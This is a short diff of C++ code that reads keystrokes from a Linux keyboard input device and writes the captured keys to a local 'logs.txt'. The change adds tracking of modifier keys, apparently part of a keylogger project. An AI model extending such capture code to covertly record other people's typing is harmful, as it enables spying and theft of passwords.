@@ -98,7 +98,6 @@ void captureEvents(std::string &kbd_device){
 
     // Opening keyboard file in Read Mode
     int input_fd = open(kbd_device.c_str(), O_RDONLY, 0);
-
     // Checking if file opened successfully 
     if(input_fd == -1){
         std::cout << "Error opening input file" << '\n';
@@ -107,7 +106,6 @@ void captureEvents(std::string &kbd_device){
 
     // Creating file to store captured keys
     int output_fd = open("logs.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-
     // Chekcing if file created and opened successfully
     if(output_fd == -1){
         std::cout << "Error creating log file" << '\n';
@@ -120,6 +118,9 @@ void captureEvents(std::string &kbd_device){
     
     // bool to hold if we are holding key 
     bool keyhold = false;
+
+    // To store mulitple modifiers (eg in shortcuts)
+    std::vector<__u16> activeModifiers;
 
     while(1){
         
